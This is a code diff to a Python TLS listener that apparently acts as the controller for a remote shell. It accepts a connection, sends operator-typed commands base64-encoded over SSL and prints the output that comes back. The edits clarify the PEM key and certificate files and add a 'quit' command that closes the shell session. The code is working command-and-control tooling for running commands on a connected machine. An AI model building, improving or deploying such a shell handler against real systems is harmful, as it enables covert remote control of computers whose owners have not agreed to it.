@@ -6,8 +6,8 @@ set the following before using:
 
 LISTENADDRESS - set to the ip of the interface you want to listen on
 PORT          - TCP port to listen on
-KEYFILE       - path to an openssl key file
-CERTFILE      - path to an openssl certificate file
+KEYFILE       - path to an openssl PEM RSA private key file
+CERTFILE      - path to an openssl PEM certificate file
 """
 
 import base64
@@ -17,8 +17,8 @@ import ssl
 
 LISTENADDRESS = '127.0.0.1'
 PORT = 4443
-KEYFILE = 'serverkey.key'
-CERTFILE = 'servercert.cert'
+KEYFILE = 'serverkey.pem'
+CERTFILE = 'servercert.pem'
 
 
 def listener(listenaddress, port, key, cert):
@@ -42,8 +42,12 @@ def listener(listenaddress, port, key, cert):
     print('listening for connections')
     conn, addr = soc.accept()
     print('received connection from {}'.format(str(addr)))
+    print('"quit" to close connection')
     while True:
         command = input(": ").encode('utf-8')
+        if command == b'quit':
+            print('closing shell connection')
+            break
         encoded = base64.b64encode(command)
         conn.send(encoded)
         cmdoutput = conn.recv(2048)
